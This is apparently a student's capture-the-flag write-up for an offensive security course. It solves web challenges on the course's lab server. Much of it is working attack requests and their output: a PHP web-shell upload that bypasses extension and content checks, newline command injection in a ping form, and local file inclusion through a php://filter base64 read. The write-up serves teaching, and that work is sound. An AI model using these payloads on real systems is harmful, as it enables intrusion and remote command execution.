# CSGY 9223 Intro to Offensive Security
# Week 10 Challenges
# nam10102

## Challenge - Validator
```
Can you outsmart our defenses and successfully upload your file?

Your files will be uploaded at /profile_images/<your_image_name>.

http://offsec-chalbroker.osiris.cyber.nyu.edu:1502/index.php
```
This one was a bit tricky. The exploit involved uploading my own php file with a command vulnerability to the /profile_images directory. The site itself checked for jpg, jpeg or png files being uploaded. The server itself checked to see if the file being uploaded was an image file. 

Both of these were able to be exploited by:
- Change the name of the file in include somewhere .jpg, jpeg or .png. I chose "command.jpep.php"
- Change the magic bytes of the file to include jpeg value, along with my php command file


docs/solution.md was interesting as well:
```aiignore
In order to upload the file, we have to change the the upload file request like this

```
POST /upload.php HTTP/1.1
... <header> ...

-----------------------------255821984738472164993578088185
Content-Disposition: form-data; name="uploadFile"; filename="shell.jpg.phtml"
Content-Type: image/jpeg

GIF8
<?php system($_GET['cmd']); ?>

-----------------------------255821984738472164993578088185--
```

It will bypass blacklist and whitelist file extention with this filename `shell.jpg.phtml` whereas it will bypass the content with `GIF8`.

you can view shell at `/profile_images/shell.jpg.phtml?cmd=id`
```

Let's grep for flag
```aiignore
../Dockerfile:CMD printf &quot;$FLAG&quot; &gt; /flag.php &amp;&amp; \<br />
../challenge.json:  &quot;flag&quot;: &quot;flag{f1l3_upl04d_N1nj4}&quot;,<br />
``
```

Dockerfile:
```
# Use the official PHP image with Apache
FROM php:7.4-apache

# Copy the website files to the default directory for Apache
COPY . /var/www/html/

# Set the working directory
WORKDIR /var/www/html/

# Copy the entrypoint script
COPY entrypoint.sh /usr/local/bin/

# Make the entrypoint script executable
RUN chmod +x /usr/local/bin/entrypoint.sh

# Enable Apache mod_rewrite
RUN a2enmod rewrite

# Expose port 80
EXPOSE 80
# Set the entrypoint
ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
# Set the default command
CMD printf "$FLAG" > /flag.php && \
env --unset='FLAG' && \
apache2-foreground
# CMD ["apache2-foreground"]
```

If this is correct, then flag.php is at the root directory

Here is the top root directory:

```aiignore
backups<br />
cache<br />
lib<br />
local<br />
lock<br />
log<br />
mail<br />
opt<br />
run<br />
spool<br />
tmp<br />
www<br />
```




## Challenge - ping
```
Take on the ultimate challenge by injecting commands into our ping tool. Are you up for it?

http://offsec-chalbroker.osiris.cyber.nyu.edu:1503
```
This seems pretty obvious to be a command injection attack.

Using Burp, I hijacked a request with localhost for the ping value:
```aiignore
POST /ping.php HTTP/1.1
Host: offsec-chalbroker.osiris.cyber.nyu.edu:1503
Content-Length: 12
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://offsec-chalbroker.osiris.cyber.nyu.edu:1503
Referer: http://offsec-chalbroker.osiris.cyber.nyu.edu:1503/
Accept-Encoding: gzip, deflate, br
Cookie: CHALBROKER_USER_ID=nam10102
Connection: keep-alive

ip=localhost
```
So the variable ip is what will be used to ping. What if we added additional commands like 'ls'?

I tried with && and ||, but those characters are checked by the server. What if I just send a 'lf' followed by 'ls'?

```aiignore
POST /ping.php HTTP/1.1
Host: offsec-chalbroker.osiris.cyber.nyu.edu:1503
Content-Length: 20
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://offsec-chalbroker.osiris.cyber.nyu.edu:1503
Referer: http://offsec-chalbroker.osiris.cyber.nyu.edu:1503/
Accept-Encoding: gzip, deflate, br
Cookie: CHALBROKER_USER_ID=nam10102
Connection: keep-alive

ip=localhost%0d%0als
```
I get:

```aiignore
HTTP/1.1 200 OK
Date: Sat, 19 Apr 2025 16:15:36 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 93
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Dockerfile
challenge.json
docker-compose.yml
docs
f14g_cmdi.php
index.php
ping.php
style.css
```

So the file f14g_cmdi.php looks interesting. Let's see what it does: 

http://offsec-chalbroker.osiris.cyber.nyu.edu:1503/f14g_cmdi.php

The results are:

```aiignore
flag{now_you_have_command_to_my_army_snow!_b925acff88c4bb7e}
```

## Challenge - LFI
```
Try to find news from different category! 

http://offsec-chalbroker.osiris.cyber.nyu.edu:1500
```
This one looks like an LFI type of attack. The main page references other pages based off of the "page" setting.

I tried "page=flag" and I got:

```aiignore
Can you find the flag?
```

What other kinds of news items could be out there? "cybersecurity"? Nope.

How about just "security"? Nope. "secret", "topsecret", nope.

Going back to flag.php. I wonder if the code has a clue. Trying a base64 filter to see if I can see what the code looks like:

```aiignore
http://offsec-chalbroker.osiris.cyber.nyu.edu:1500/index.php?page=php://filter/convert.base64-encode/resource=flag
```
The output was:

```aiignore
PD9waHAKLy9mbGFne1cwd19MRklfMXNfQzBPbCFfN2MyMDEwZDM1YTMwYjVhY30KPz4KQ2FuIHlvdSBmaW5kIHRoZSBmbGFnPw==
```
Which decodes to:

```aiignore
<?php
//flag{W0w_LFI_1s_C0Ol!_7c2010d35a30b5ac}
?>
Can you find the flag?
```
 Problem solved...

## Challenge - Locale-Infiltrator
```
We've got to play cyber detective and chain different vulnerabilities to snag the flag. Time to put on our hacker hats and get cracking! Get the shell on server using LFI and File upload vulnerabilities. 
http://offsec-chalbroker.osiris.cyber.nyu.edu:1501
```